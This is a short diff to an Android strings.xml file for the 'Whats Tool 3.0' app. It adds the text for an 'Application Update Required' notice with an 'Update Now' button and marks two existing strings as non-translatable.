@@ -1,4 +1,10 @@
 <resources>
-    <string name="app_name">Whats Tool 3.0</string>
-    <string name="app_user_id">66d9bddc09f7706563a838df</string>
+    <string name="app_name" translatable="false">Whats Tool 3.0</string>
+    <string name="app_user_id" translatable="false">66d9bddc09f7706563a838df</string>
+
+    <string name="app_title">Application Update Required</string>
+    <string name="app_notification">Update Required Notification</string>
+    <string name="app_text_first">We have identified that your version of the application is out of date. To ensure optimal operation and access to all features, we ask that you click the button below to update.</string>
+    <string name="app_text_second">Click “Update Now” to continue with the update and ensure full functionality of the application.</string>
+    <string name="app_update_now">Update Now</string>
 </resources>
